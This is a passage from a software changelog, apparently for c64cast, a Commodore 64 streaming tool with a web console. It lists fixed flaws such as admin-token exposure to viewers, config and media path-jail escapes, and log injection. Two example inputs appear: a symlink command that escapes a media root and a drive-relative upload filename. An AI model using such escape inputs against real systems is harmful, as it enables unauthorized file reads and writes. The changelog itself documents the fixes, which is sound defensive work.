  characters and capped at 64 bytes before being logged, closing off a
  hostile or misconfigured peer forging lines into `--log-file` output.
- `make_backend` (`backend.py`) and `resolve_system` (`hw_provision.py`)
  compared `[ultimate64].system` to `"NTSC"`/`"auto"` without normalizing
  case, while every other consumer of the field (`resolve_host_sid_model`,
  `c64.py`, `scene_factory.py`, `music_features.py`) does — nothing at
  config load enforces the canonical spelling, so `system = "ntsc"` used to
  reach `make_backend` intact and pace an NTSC machine at the PAL 50 fps
  with no diagnostic. `BufferedWriteBackend.write_memory` never incremented
  `stats["bytes"]` (only `write_memory_file` did), so every `write_regs`
  register push — the per-frame VIC/`$D418` traffic — was invisible in the
  byte counter the architecture doc's throughput figures are derived from.
  A write listener that failed on every write (a full disk, a stale preview
  widget) logged a full traceback per write, up to the write rate; it now
  follows the same 1st/10th/50th/200th ladder `_emit`'s failure path already
  uses. `BACKENDS`'s comment overclaimed that it "maps the token to its
  base profile" — it's a bare tuple consumed only by the CLI's `--help`
  choices; the real dispatch is `make_backend`'s own `if`/`elif` chain, now
  documented as such. `write_region`'s docstring now states the 16-bit
  address bound it was already relying on callers to honor.
- The TeensyROM+ transport (`teensyrom_dma.py`/`teensyrom_api.py`):
  `_settle_after_launch` read `self.tr.transport` directly after
  `launch_file()` had already released `TRClient`'s lock, unsynchronized
  against the keyboard/menu poller's concurrent `read_memory` calls on the
  same link — exactly the window the documented, still-open launcher-upload
  race lives in. It now goes through a new locked `TRClient.
  drain_after_command`, and the class docstring is scoped to state plainly
  that the per-command lock doesn't cover this asynchronous post-ack
  chatter. `delete_file`/`post_file`/`launch_file` raised a bare
  `UnicodeEncodeError` for a non-ASCII path instead of the `TRError` family
  every caller in this module is documented to expect, and didn't reject an
  embedded NUL (which would truncate the device's parse early and desync
  the following command's framing) — both are now validated before
  framing. `SerialTransport.drain_text` never overrode the fixed 2s
  `io_timeout` on its underlying `read()`, so the common "nothing to
  drain" case paid a full io_timeout stall instead of returning after its
  own `quiet_s`; it now does, restoring the prior timeout afterward.
  `SerialTransport.recv_exact`'s overall deadline was only checked when a
  read returned nothing, so a link that trickled in at least one byte per
  call never tripped it and could hold `TRClient._lock` indefinitely;
  `TcpTransport.recv_exact` tracked no deadline at all, the same gap with
  no partial mitigation. Both now check a cumulative deadline every
  iteration. Both transports' `drain_text` also had no hard ceiling on
  total time or bytes independent of the quiet-window reset, so a
  misbehaving or hostile device that never quite goes idle could hold the
  drain — and the lock every write/read command needs — open indefinitely;
  both now bail (logged) past a fixed wall-clock/byte cap. Device-supplied
  text (NAK reasons, the Ping status line, the Reset response line) is now
  filtered to printable characters at the transport boundary before it can
  reach a log record or an exception message. `probe()` treated a fully
  empty Ping reply (which `drain_text` returns instead of raising, even
  when the TR is hung or disconnected) the same as a successful-but-blank
  reply, fabricating a "TeensyROM (... firmware)" liveness string for a
  device that sent zero bytes back; it now returns `None`, matching its own
  documented contract. `describe_device` reached past `TRClient` into the
  concrete `SerialTransport` class via `isinstance`; `TRTransport` now
  exposes an optional `serial_number` property (`None` by default) that
  `describe_device` reads polymorphically instead. Two findings from this
  pass are documented rather than fixed, for lack of a way to fix them from
  this client: the wire protocol has no ReadFile-from-storage token, so
  there is no host-side readback/hash check that could run between
  `post_file()` and `launch_file()` beyond the checksum `post_file` already
  verifies device-side; and `_upload`'s pre-delete swallows every delete
  failure, not only "file doesn't exist", because the firmware's FailToken
  carries only free text with no known, stable "not found" pattern to
  narrow the catch against.
- The web console's config store (`config_store.py`) treated `[web].token`/
  `token_file`/`viewer_token` and `[control].token`/`viewer_token` as
  ordinary fields: `config_serialize.SECRET_FIELDS` only ever named the DMA
  password, so `describe()`'s form data and `_editable_fields()` handed a
  viewer-role `GET /api/configs/{ref}` the console's own admin token —
  turning a shared "watch the show" link into full control of the host.
  `SECRET_FIELDS` now also names the five token fields, which (matching the
  DMA password) makes `describe()`/`patch()` withhold them and makes a form
  save refuse a file that carries one rather than silently drop it on
  re-serialize. `read()`'s raw `text` still carries any secret verbatim —
  gating that behind the full-token role, or masking a secret assignment in
  it, needs a role in hand and belongs to `web_api`/`auth`, not this store;
  documented on `read()` rather than guessed at here. Alongside it: the
  ref/write jail (`resolve()`) enforced `.toml`-suffix and root-containment
  but let a ref name a file `NON_CONFIG_NAMES`/`NON_CONFIG_DIRS`/the dotfile
  rule already hides from the listing — a read/write primitive for
  `.cargo/config.toml`, `pyproject.toml` and the like on the cwd-fallback
  root; those rules now gate `resolve()` itself, not just `_walk`.
  `_require_writable` decided read-only by the ref's *label* rather than by
  path containment, so a source checkout's cwd root (which physically
  contains the packaged examples underneath it) could reach and overwrite
  them through its own writable label; it now checks containment against
  every root. `_validate_text_and_load` and `read()` handed submitted text
  (or a file already on disk) straight to `config.load_master`, which opens
  an `[ensemble].systems[].config` path verbatim when absolute — a read
  primitive for any file on the host, since a parse failure on the named
  target embeds its path, a source line and a caret; both now refuse before
  the text ever reaches the loader, with a fixed, non-echoing message.
- The web console's validate/edit paths (`config_store.py`) had a cluster of
  bugs stemming from the same design: `_capture_errors` attached its
  collector to the shared `c64cast` logger with no thread filter, so a
  `--serve` process's live-session workers (render/audio/DMA, on other
  threads) had their unrelated ERRORs folded into another request's report
  — and, via `_machine_layer_notes`'s unanchored `key not in blame`
  substring test, could misattribute a validation failure to a machine
  setting a short common key (`url`, `path`, `port`, `device`) merely
  happened to share with the failure text. The collector is now filtered to
  its own thread and capped at 200 records; blame now requires a
  word-boundary match on both the key and its section, checked only against
  `report["error"]` (not the captured log); and `_machine_layer_notes` now
  skips `SECRET_FIELDS` keys outright and never echoes a machine setting's
  `value` (only `path`/`section`/`key` — the attribution its own docstring
  argues for). `_validate_text_and_load`'s scratch-file `mkstemp` and the
  write that followed sat above the `try` whose `finally` unlinks it, so a
  write failure (ENOSPC, a remount to read-only) left `.c64cast-check-*.toml`
  behind — invisible to the listing — and escaped as a bare `OSError`
  instead of the `PathRejected` report the `mkstemp` half was already
  careful to produce; both now share one `try`/`except`. `validate_text`
  (and so `write`/`create`) had no size cap of its own — `write` enforced
  `MAX_BYTES` but the scratch file could still take an unbounded POST body
  onto disk first — now shared via one `_require_within_limit` every text
  entry point calls. Lastly, `_apply_edit` setattr'd an edit's raw JSON onto
  a container field (`overlays`, `[scenes.color]`, `hue_corrections`,
  `clips`) with no shape check, so a wrong-shaped value (a string for a
  list, a list of non-tables) reached `config_serialize`'s `[[...]]`
  emitters and raised a bare `TypeError`/`AttributeError`/`ValueError` —
  an unhandled 500 on an authenticated route — instead of `EditRejected`;
  `_apply_edit` now checks the value's shape against the field's own
  dataclass annotation before `setattr`, and `_rewrite`'s re-serialize call
  widens its `except` as a backstop. `describe()` also no longer shadows
  the module's `dataclasses.fields` import with a same-named local (latent
  today, but one field-list lookup away from `TypeError: 'list' object is
  not callable` from inside a request handler).
- `config_serialize.py`: `_emit_table_array`'s `annotate` parameter was
  never read in its body, so `[[color.hue_corrections]]`/`[[scenes.overlays]]`/
  `[[scenes.color.hue_corrections]]` blocks got no per-param help comments
  even when the caller asked for them — the parameter is dropped rather
  than wired up, since nothing needed it. The four hardcoded
  `if sd.name == "color"`/`"performance"` branches inside `_emit_section`
  deciding which field renders as a `[[...]]` block are now one
  `_SECTION_TABLE_ARRAYS` lookup — which caught a real, independent gap in
  the same class while adding the drift test the fix calls for:
  `[midi_control] cc_map` (`list[dict[...]]`, and documented as
  `[[midi_control.cc_map]]` in its own help text) was falling through to
  `_fmt_value` and rendering as an inline array of inline tables; it now
  routes through the same block emitter. `_emit_scene` iterated only the
  fields `introspect` lists for a scene's current `type`, so a field the
  type doesn't claim but that carries a non-default value anyway (set
  while the scene was a different type, or by a structured edit) was
  silently dropped on every re-serialize — `load` never enforces
  `applies_to`, so this broke `load(dumps(cfg)) == cfg`, the module's own
  contract; such a field is now emitted alongside the type's own. A scene
  color override of exactly `{"hue_corrections": []}` serialized to a bare
  `[scenes.color]` header with nothing under it, reloading as `{}` — an
  empty override is still an authored key on the scene's sparse dict, so it
  now round-trips as an explicit `hue_corrections = []`. `SECRET_FIELDS`
  gained the `[web]`/`[control]` token pairs (see the config_store entry
  above) — it governs `dumps()`, `describe()`'s form and
  `_editable_fields()`, not `config_store.read()`'s raw text (documented on
  `SECRET_FIELDS` itself).
- `schema.py`: a `choices`-bearing union-typed field (`[ultimate64]
  sid_play_rate`, `str | float`) emitted a top-level `enum` alongside its
  `type: ["string", "number"]`, so the documented numeric form ("a number
  pins every vsync tune to that rate in Hz") failed schema validation in
  every editor pointed at the committed schema — `jsonschema.validate` on
  `50.0` raised `50.0 is not one of ['auto', 'off']`. Choices on a union
  now constrain only the string branch via `anyOf`, leaving the other
  branch(es) unconstrained. `_field_schema`'s `name` parameter, passed at
  every call site and never read in the body, is removed.
- `PollThread` (`_pollthread.py`) could resurrect a worker it had just
  abandoned: `stop()` joined with a bounded `join_timeout` (0.5 s default)
  and then unconditionally cleared `self._thread` even when the join timed
  out and the target was still running (e.g. `RssOverlay`/`WeatherOverlay`'s
  `requests.get(timeout=5.0)` outliving it on a slow feed). A later `start()`
  then saw `is_running() == False`, called `self._stop.clear()` — which the
  still-running worker reads through the same shared `Event` — and spawned a
  second thread on top of the first, un-stopped. `stop()` now keeps the
  thread reference on a timed-out join (logging a warning) instead of
  discarding it, so `is_running()` stays truthful and `start()`'s existing
  "already running" no-op refuses the duplicate until the abandoned worker
  actually exits. Separately, an unhandled exception from a target used to
  end the thread via `threading.excepthook`, which prints straight to raw
  stderr and bypasses `--log-file`/`SessionLogBuffer` entirely — `_run` now
  catches it and calls `log.exception`, stopping the loop the same way as
  before but leaving a record in both durable sinks. `__init__`'s single
  `Callable` annotation also hid that periodic and manual mode want
  incompatible target signatures (`() -> None` vs. `(Event) -> None`); it
  now `@overload`s two constructor shapes so a wrong-arity target is a type
  error at the call site, with no change to any of the 21 consumer call
  sites. New `tests/test_pollthread.py` cases pin the abandon-then-refuse
  sequence and the exception-to-logging path.
- `silence_native_stderr` (`_native_io.py`) had two independent descriptor
  leaks on its own failure paths (`saved = os.dup(2)` sat outside its `try`,
  so a failing `os.open(os.devnull, ...)` leaked it; `os.close(devnull)` sat
  after `os.dup2(devnull, 2)` inside the `try`, so a failing `dup2` leaked
  `devnull`), and no mutex or nesting depth around its dup/dup2/close
  sequence on the process-global fd 2 — two overlapping (non-nested) callers
  (reachable in practice: `video._ensure_pyav` is a lazily-triggered entrant
  from playlist worker threads, one per system in an ensemble) left the
  second caller's `os.dup(2)` capturing the first caller's `/dev/null`
  redirect as its own "saved" fd, so whichever exited last pinned the
  process's real stderr to `/dev/null` permanently. A module-level depth
  counter behind a lock now makes the redirect reentrant across both nesting
  and overlap (only the outermost enter/exit touches fd 2), and both
  descriptors are released on every failure path. New `tests/test_native_io.py`
  — previously nothing imported this module at all — pins silencing,
  restoration, the overlapping-threads case, and a 200-cycle no-fd-growth
  check; it skips on Windows, where `os.set_blocking` (the fixture's way of
  draining fd 2's pipe without blocking) doesn't exist.
- `_midi.open_input_port`'s only guard against a missing `midi` extra was a
  bare `assert mido is not None`, stripped entirely under `python -O` and
  otherwise surfacing as `AttributeError: 'NoneType' object has no attribute
  'get_input_names'` — a message naming nothing about the extra a caller
  forgot to check. It now raises `RuntimeError` naming the install command,
  matching the contract every other precondition on this shared resolver
  already documents. New `tests/test_midi.py`.
- `_redact.py`'s pattern matched only a literal `token=` immediately followed
  by the value — the shape of today's console login-URL log line, but not
  `token = "…"` (spaces, as a TOML/config rendering would produce), `"token":
  "…"` (JSON), or an `Authorization: Bearer …` header, any of which could put
  the console's admin token into `--log-file` or a viewer's `SessionLogBuffer`
  tail in a future rendering with no test catching it. The pattern now covers
  `token`/`password`/`secret`/`api[_-]key` with `=` or `:`, quoted or not,
  plus a `Bearer <value>` alternative.
- `hw/c64.py`'s `cpu_clock`/`frame_rate`/`kernal_cia1_latch` silently treated
  any system string other than exactly `"NTSC"` as PAL — including the
  unresolved `"auto"` config default (which `config.SYSTEM_CHOICES`
  explicitly allows) and any typo or trailing whitespace — giving every
  clock-derived constant (CIA latch, NMI safety band, SID PLAY rate) the
  wrong standard's numbers with zero diagnostic; `hw/api.py` already
  hand-guarded one call site against exactly this. They now accept only
  `"NTSC"`/`"PAL"` (case-insensitive, whitespace-tolerant, matching every
  other consumer's own `.upper()` convention) and raise `ValueError`
  otherwise. `scene_factory.validate_nmi_sample_rate` and
  `doctor._validate_audio_nmi_rate` both run before hardware opens (so
  `[ultimate64].system` can still be the unresolved `"auto"` there) and now
  resolve it to NTSC first, matching that field's own documented fallback
  and `hw_provision.resolve_system`'s convention, instead of reaching the
  PAL branch by accident. `actual_rate_for_latch` now raises on a negative
  latch instead of a bare `ZeroDivisionError` on `latch == -1`. Two register
  annotations were also corrected (`VIC_BANK_0.BITMAP`'s `$D018` bitmap
  nibble is `8`, not `4`; `CPU.PORT_IO_OUT` = `$34` has CHAREN, bit 2, still
  set — LORAM=HIRAM=0 is what maps RAM instead of ROM/I/O), and
  `RASTER_VBLANK_LINE`'s comment no longer calls line 248 the start of
  vblank (it is the first line past the last badline — a narrower property
  that breaks if YSCROLL or the row count changes; vblank itself is lines
  ~300+ on PAL, ~13-40 on NTSC). New `tests/test_c64.py` pins the
  system-string handling and the two negative/zero-rate guards.
- `char_rom.py`'s load path (`_read_glyphs`, behind every `load_glyphs`
  call) only length-checked a resolved charset, while `install_data` ran the
  full structural `verify()` — so a stale hand-copied file, a wrong file at
  a configured `charset_path`, or any other 2 KB file at a resolved path
  rendered garbage glyphs with no diagnostic, and (since `ensure_installed`
  treated any non-`None` `resolve()` as "already have one") permanently
  suppressed the auto-dump that would have fixed it. The load path now runs
  the same `verify()`, falling back to the builtin font with a warning
  naming the reason; `ensure_installed`'s gate now requires that resolved
  file to actually verify before it counts as "nothing to do". A configured
  `charset_path` that doesn't exist at all was also silently absorbed by
  `resolve()`'s fall-through with no record anywhere despite the module's
  own docstring promising "a warning from the caller" — `_read_glyphs` now
  logs one, naming the configured path and what it fell back to.
  `video.framebuffer.Framebuffer`'s own duplicate pre-check for exactly this
  case is removed now that every caller gets the same diagnostic centrally.
  Also fixed: an inverted verification-rationale docstring (an all-`$00`/
  all-`$FF` buffer *fails* the reverse-video complement check outright; the
  `$20`-blank/`$01`-not-blank pair is what catches a buffer whose halves
  complement *by construction*, which the complement check cannot see
  anything wrong with) and a British "synthesises" in the module docstring.
  New/updated cases in `tests/test_char_rom.py` and `tests/test_framebuffer.py`.
- The web console's media browser (`media_store.py`) listed a directory as a
  browsable entry straight off its unfiltered file list, before the per-file
  symlink-escape check below it ever ran — so a directory whose only
  kind-matching member was a symlink pointing outside its root
  (`ln -s /home/other/private.mp4 assets/videos/leak.mp4`) was still offered
  as a listed entry, and `resolve_file_spec` treats a listed directory as a
  randomizer that picks a member at each scene `setup()`, following that
  symlink onto HDMI — reachable by anyone with local or group write access to
  a media root, not the HTTP surface (uploads only ever create regular
  files). `_candidates` now filters a directory's hits against the jail check
  before deciding whether to yield the containing directory at all, so the
  directory and file listings agree about what's actually inside the root.
- `MediaStore.receive`'s upload commit (`media_store.py`) had three related
  gaps. A failed `flush()`/`fsync()` (disk full) left the abort handler's own
  `file.close()` re-raising the same `OSError` a second time before
  `os.unlink` ever ran, orphaning the up-to-512-MB `.part` file the module's
  own docstring promises never survives a failure. Separately, `_unique_name`'s
  `-2`/`-3` collision suffix could lengthen an already-at-the-cap name past
  the filesystem's own limit, and an embedded NUL byte passed every
  structural check (`Path.exists()` silently swallows the `ValueError` a NUL
  raises) — both then died inside `os.replace` as an untyped
  `OSError`/`ValueError` that no caller's `MediaStoreError` mapping could
  classify, turning a name the store meant to refuse into an unhandled 500
  after the whole body had already been streamed. And `destination()`'s
  docstring promised a jail re-check against the joined path that no caller
  actually ran; on Windows — a first-class target per `paths.py`'s
  `os.name == "nt"` branches — that's exploitable outright, since
  `PureWindowsPath('D:/media') / 'C:evil.prg'` discards the left operand
  entirely, landing a drive-relative name wherever the process happened to
  be on that drive. `receive` now suppresses `OSError` from its own cleanup
  so it can never replace the failure that triggered it, and re-checks
  `directory / final_name` against the root before `os.replace`;
  `_unique_name` now rejects a `-2`/`-3` candidate that would cross
  `_MAX_NAME_BYTES` itself (`MediaNameRejected`, before `os.replace` ever
  sees it) rather than leaving that to a raw, host-dependent `ENAMETOOLONG`,
  and `_reject_unless_bare_filename` refuses a drive-relative name
  (`ntpath.splitdrive`) and an embedded NUL outright. A commit-time
  `OSError`/`ValueError` that isn't one of those refusals (a full disk mid-
  `os.replace`, say) is still wrapped as `MediaStoreError`. Every aborted or
  committed upload is now logged — `%r`, not `%s`, since the name comes
  straight from an untrusted upload — where before this module's one
  long-running, network-reachable write left no trace of a failure anywhere
  in `--log-file`.
- `MediaStore.index`'s `q`-filtered search (`media_store.py`) applied its
  needle match *before* the `MAX_FILES` display cap so a search could reach
  media a plain listing had already truncated away — but that also meant a
  query matching nothing never tripped `truncated`, so it walked every
  configured root to `MAX_DEPTH` in full (resolving every kind-matching file
  along the way) with no way for the response to say the scan was unbounded;
  a search against a host rooted at `~` or an HVSC mirror could stall the
  console on one trivial `GET /api/media?q=` while it's also encoding video
  for a running show. `index` now also counts every candidate it visits
  against a new `_MAX_SCAN` ceiling (independent of `MAX_FILES`, an order of
  magnitude above it) and sets `truncated` once that trips.
- `MediaStore.destination` (`media_store.py`) reported a kind whose
  configured directory doesn't exist yet with the same "not configured on
  this host" message as a kind nobody ever named for upload — sending an
  operator looking for a TOML setting that was already correct, since the
  host *is* configured and only the directory is missing. The two cases are
  now distinguished in the refusal message. Separately, `MediaRoot.writable`
  silently disagreeing with `_write_roots` — reachable only if a future
  refactor resolved read-only roots before write roots — is now an assertion
  in `resolve_root` rather than an invariant that depended on `__init__`'s
  two loops staying in this order with nothing to say so if they didn't.
- `ConsoleLibrary._load` (`console_library.py`) iterated
  `raw.get("favorites", [])`/`raw.get("recents", [])` unguarded —
  `dict.get`'s default only applies when the key is *absent*, so a foreign
  or half-written `console.json` containing `{"favorites": null}` (or a bare
  string or number) raised `TypeError` straight out of `as_dict`,
  contradicting the documented "a missing, corrupt, or wrong-shaped file
  reads as an empty library" contract and taking `GET /api/library` down
  with a 500 instead of self-healing. Both containers are now type-checked
  as lists before iterating.
- `record_recent` capped its list at `MAX_RECENTS`, but `set_favorite`
  (`console_library.py`) had no equivalent — a client holding the write
  token could loop distinct refs and grow `console.json` (read-modify-
  written whole, on every call, and served back to every browser and phone
  pointed at the host) without bound. Favorites are now capped at a new
  `MAX_FAVORITES`, and both `set_favorite` and `record_recent` reject a ref
  over 512 bytes. Separately, an empty ref used to be accepted, appended,
  and returned, only to be silently dropped by `_load`'s own filter on the
  very next read — both methods now treat a falsy ref as a no-op, so the
  return value never disagrees with what's actually persisted.

## [0.4.0] - 2026-08-30

### Upgrade notes

- **`[color].flicker_tolerance` is new, and its flicker sits inside the ITU-R
  BT.1702 photosensitive-seizure band.** It is opt-in and off by default.
  `[color].flicker_max_luma_delta` (default 0.075) bounds the brightness gap
  that governs the hazard, but it warns rather than refuses — read
  [caveats.md](docs/caveats.md) before turning this on.

- **A `[control]` plane bound to a non-loopback address now needs a token.**
  With `[control].host` set to anything other than `127.0.0.1`, `localhost` or
  `::1` and `[control].token` empty, the run used to start with a warning; it is
  now a configuration error, refused before the hardware is opened and reported
  by `c64cast --doctor`. Set `C64CAST_CONTROL_TOKEN` (preferred) or
  `[control].token`, or open the port deliberately with `[control]
  allow_unauthenticated = true`. Loopback is unchanged. `--serve` is unaffected
  — that surface has never had an open mode.

- **The browser console needs the new `web` extra.** A `c64cast[all]` install
  picks it up on a plain `uv tool upgrade c64cast`; a narrower install does not,
  because extras do not accumulate — name every extra you want in one command:

  ```bash
  uv tool install --force 'c64cast[video,midi,web]'
  ```

  Without it, `--serve` reports the missing extra instead of starting. `c64cast
  --doctor` lists what the running install can import.

- **If your config's first line is a version-pinned `#:schema` URL, replace
  it.** `c64cast --doctor` now reports a directive that has stopped describing
  this install and prints the replacement; `c64cast --print-schema-path` gives
  it on its own. Put its answer on line 1 with `#:schema ` in front — it names
  the schema inside your install, so every future upgrade updates it too and
  this is the last time you touch the line.

### Added

- **`c64cast --serve` runs a web console host** (with the new `web` extra). The
  program becomes a server that owns the Commodore and starts, stops and
  switches shows on request, re-reading the config from disk on every start.
  New `[web]` section: `enabled`, `host`, `port`, `autostart`, `settle_s`.
  Lifecycle routes are `GET /api/session` and
  `POST /api/session/{start,stop,switch,reload}`; `GET /api/introspect` returns
  the whole config model as JSON; `WS /api/ws` carries live state and log lines
  as they happen. A start answers `202` and reports over the socket; a start
  while something runs is a `409`; a config that will not run is a `422` refused
  before anything touches the machine. Everything `[control]` already served
  rides the same port and answers `503` between shows.

- **The `--serve` host is never unauthenticated.** With no token configured it
  generates one, stores it `0600` under the data directory, and prints a
  ready-to-open login URL. `[web].token` / `token_file` / `$C64CAST_WEB_TOKEN`
  set your own; `[web].viewer_token` grants a read-only role. A browser arriving
  without the cookie gets a token-paste form; scripted callers keep their
  plain-text `401`.

- **The browser console ships prebuilt inside the package** — `uv sync` and
  `pip install` both give a working console with no Node. Node is needed only to
  change it: the sources are Svelte 5 + Vite + TypeScript + Tailwind under
  `web/`, `make web` rebuilds them, and CI fails if the committed bundle and its
  sources disagree. A checkout that has never run `make web` falls back to the
  zero-dependency `/perf` page with a line in the log saying so.

- **The console browses a config library, not a raw file list.** The Session tab
  shows Favorites and Recently launched; the full searchable, sortable list —
  with a show/hide toggle for the packaged examples — lives on the Editor tab.
  Favorites and recents are server-side state
  (`~/.local/share/c64cast/console.json`), shared across devices, and a launch
  from any surface counts as a recent. Files show a short name (the config root
  and `.toml` stripped, subdirectories kept); double-clicking one starts it; a
  persistent Start/Switch button tracks the selection on every tab; starting a
  show switches to the Live tab once it comes up. There is no more "host
  default" config — the supervisor reports `config_ref` before the first start.

- **The console reads and edits configs.** `[web].config_roots` bounds which
  directories it may read and write `.toml` files in — nothing outside a root
  (including through a symlink planted inside one), nothing that is not `.toml`.
  The *Settings* view gives every scene field and setting a typed control with
  the same one-line explanation `--describe` prints, a `live` mark on the ones a
  reload picks up, and the value the loader actually resolved; a finder searches
  all 167 settings past the "only what this file changes" filter. Edited rows
  are marked and counted; **Save** writes them in one request, **Undo** and
  **Discard** drop them, and **Clear** stops the file setting a field and shows
  what applies instead. The browser never writes TOML — `PATCH
  /api/configs/{ref}` takes named field edits and the host composes the file
  through the loader's own dataclasses, so two consoles editing different
  sections do not clobber each other. A save that would not load is refused with
  the loader's own reason, the file untouched, the prior text kept as a hidden
  `.bak` sibling. The *Source* editor is still how you write a config you have
  annotated by hand, and the only way to edit an ensemble master.

- **Structural edits from the console.** Each scene has **Duplicate** and
  **Remove**; **Add scene** has a type picker; **↑**/**↓** reorder it
  (`PATCH /api/configs/{ref}/scenes/{index}`). New / Duplicate / Delete on the
  Editor work on a packaged example too — the intended way to fork one into an
  editable starting point. These write immediately, so staged edits have to be
  saved or discarded first; removing the last scene is refused; a new scene with
  no media saves with a report of what is still missing rather than being
  refused. A config carrying a DMA password is refused outright.

- **A media picker and browser upload.** `GET /api/media?kind=&q=` browses
  `[web].media_read_write` — a *kind → directory* table, replacing the
  unreleased `media_roots` — and `media_read_only`, defaulting to the four
  directories the loader already defaults to. A `file =` field is a combobox
  (free text, a glob, a comma-separated list and a directory all stay typeable)
  and is its own search box, debouncing into a live query with a "truncated"
  note past the cap. **Upload…** or a drag-drop streams the file straight to
  disk (`PUT /api/media/{name}`, never buffered whole in memory), PATCHes the
  field, and never overwrites — a taken name becomes `clip-2.mp4`. A real
  progress bar with a Cancel button; a `viewer` token is refused; an unknown
  `media_read_write` kind fails at startup.

- **A Live performance screen** — the beat grid, the clip grid, the effect rack
  and the look pads on one page. The tempo with a pulse on the current beat and
  **Tap**; a pad per `[[performance.clips]]` entry lit for what is playing and
  what is queued, with the count-in in beats; a bypass button and a slider for
  every knob the current scene's effects declare; eight pads that recall or
  store a look. It drives the same engine a MIDI controller drives, off the same
  live feed the rest of the console reads. Pads are pressed and released, so a
  `gate` clip holds while your finger is down. An ensemble puts each machine on
  its own tab and address (`/live/left`). A read-only token watches all of it
  and drives none of it.

- **A Tune panel on the Live screen** — the color pipeline, the generator and
  the scope from a phone: dither strength and method, palette mode, color
  matching, cell strategy, motion smoothing, auto-fit, every generator's speed
  and scale, the scope's gain. It is generated from what the running scene
  declares, so no control on it does nothing, and a knob turned in the browser
  is recorded exactly like a MIDI CC.

- **Keep what you tuned, from the browser.** The Tune panel shows every
  color-pipeline change since the show started — where it began and where it is
  now — and writes it into the running config on one tap. The write is a patch
  of the file *on disk*, not a dump of the loaded configuration, and is refused
  if it would leave the config unable to load. A change no field carries is
  listed and marked *runtime only* rather than dropped; a quick-playback run
  gets the same pasteable block the command line prints. `palette_mode` and
  `cell_pick` save back now too — `palette_mode` into whichever `[[scenes]]`
  block was on screen when you turned it, kept separately per scene, and *runtime
  only* for a scene the config never named.

- **Per-scene `[color]` overrides.** Any `[[scenes]]` block can override part of
  the global `[color]` section for itself alone in a `[scenes.color]`
  sub-table; a field left out follows the show-wide default. This is what lets
  one playlist mix a grayscale-forced `mhires` video with a full-color one. A
  live-tuned color knob saves into the scene's own block when that scene
  overrides the field, and into `[color]` otherwise.

- **Transport in the console.** Pause / resume, skip and jump-to-scene (a jump
  is a cut — no interstitial in front of it). The Live tab's **Freeze** freezes
  a video in place with the audio muted, distinct from the machine-level pause
  the C= key does, and appears only for a scene that has a transport; alongside
  it, a scrub bar, press-and-hold rewind / fast-forward, and A/B loop set/clear
  plus recall pads for a video's saved loop points. The old pause/skip moved to
  the legacy `/perf` page.

- **The `/perf` page reaches everything the host will take** — Tune, the tune
  record with a **Keep**, Scenes with a jump, and pause / skip beside the tap
  tempo, alongside the clips, effect rack, tempo and looks it already had. It
  stays the zero-dependency gig-day fallback.

- **The Live screen can be driven from the keyboard** — Space pauses, `t` taps
  the tempo, `n` skips, `f` freezes, `l` toggles the A/B loop, `[`/`]` rewind
  and fast-forward while held, `1`–`8` launch a clip slot, `?` shows or hides
  the scene list. Every shortcut backs off the moment a text field, select or
  button has the focus, and none reaches past a read-only console.

- **Hand somebody a read-only link.** The Session screen mints a viewer link on
  the first ask — not at startup — and then keeps it, so it still opens after a
  restart. It follows the show and can do nothing else: no start, no stop, no
  tuning, no config writes. Setting `[web].viewer_token` yourself still works
  and is used as-is.

- **The C64's screen, in the browser.** The Live screen shows the picture, and
  it comes from the machine rather than from c64cast: the Ultimate 64's FPGA
  taps the VIC's own output and sends it as UDP, taking no C64 cycles — so it is
  what the VIC actually painted, right even for a game under the launcher or a
  machine somebody is typing on. Press **Watch** to start it and **Stop** to end
  it; leaving the screen ends it too. `[web].screen_fps` sets how often the host
  encodes a frame, and `0` turns the picture off. Ultimate 64 only, and the
  console says so on a U2+ or TeensyROM+ rather than showing a blank panel.
  `/perf` gets the picture too, as one scriptless `<img>`.

- **A color field is the sixteen colors.** `border` and `background` accept a
  C64 color name or an index, with a selector saying which you are writing, and
  a color field draws the palette as swatches from the host's own emitted
  colors. `force_palette_colors` gains the same treatment — a count, or a
  whitelist picked from the swatches.

- **The log follows you** — a collapsed bar on every screen showing the latest
  line, opening in place, so a refused save or a scene that failed mid-show is
  not a tab away from wherever you were.

- **The console says what a reload will apply.** A reload re-reads the file and
  rebuilds the scenes, but `[audio]`, `[video]` and `[ultimate64]` are read once
  when the session starts. The save now says which of your changes a reload
  covers and which need a restart, the staged-edit bar warns before you save
  rather than after, and the running-show banner offers a **Restart on this
  config** when a reload would not be enough. The Configs screen flags the
  running show and offers **Reload scenes** there.

- **`[web].setup_wizard` — a one-time, unauthenticated first-run form for a
  pre-provisioned appliance.** Off by default, and meant only for an OS image
  that ships c64cast with no connection target and no token anyone has seen:
  while pending, the console shell and `/api/setup` are reachable with no
  credential and every other route answers `503`. Completing it writes machine
  settings the same way `--save-settings` does, restarts the host in place, and
  signs the browser in to the ordinary token-gated console. `c64cast
  --reset-setup` clears the marker so the next `--serve` asks again. See
  [SECURITY.md](SECURITY.md) for the exposure this opens and when it closes.

- **The web console advertises itself over mDNS** (`_c64cast._tcp.local.`) when
  `--serve` binds a non-loopback `host`, so a discovery client can tell an
  unconfigured box from a configured one without first knowing its IP. The TXT
  record carries the c64cast version and whether the setup window is still open.
  Needs the `web` extra's new `zeroconf` dependency; silent on the loopback
  default.

- **A session supervisor (`c64cast/app/serve.py`).** `SessionManager` moves one
  session through `idle → starting → running → stopping → idle`, with a settle
  window between teardown and the next start (the U64's DMA service refuses new
  connections for a few seconds after one closes, and a camera refuses to reopen
  straight after release), a poller that notices a non-looping show ending by
  itself, a bounded log tail, and a run marker that resets the machine on the
  next start if the last run died mid-show.

- **The `[control]` plane can be locked with a shared token.**
  `[control].token` (or `$C64CAST_CONTROL_TOKEN`, which wins) is then required
  on every route including `/perf` and its WebSocket — `Authorization: Bearer`,
  `X-C64Cast-Token` or `?token=` for scripts, `/api/login?token=…` then an
  `HttpOnly; SameSite=Strict` cookie for a browser. `[control].viewer_token`
  grants reads only. The default is empty — today's behavior — and binding a
  non-loopback `host` without a token now warns the run is drivable by anyone
  who can reach it.

- **`--upgrade` and `--check-for-updates` — one command, any install method.**
  `--upgrade` detects whether this install is `uv tool`, pipx, plain pip or a
  development checkout and runs that installer's own upgrade command, keeping the
  extras already installed. It prints the exact command first and asks before
  running it (`--yes` skips the prompt); a development checkout refuses on
  uncommitted changes rather than `git pull` over them. `--check-for-updates`
  asks the same question without touching anything, and `--doctor` folds the
  check into its ENVIRONMENT section (skipped under `--skip-probe`).

- **`c64cast --check-for-updates --write-state` records the answer**, and two
  read-only surfaces report it without querying PyPI themselves: the web
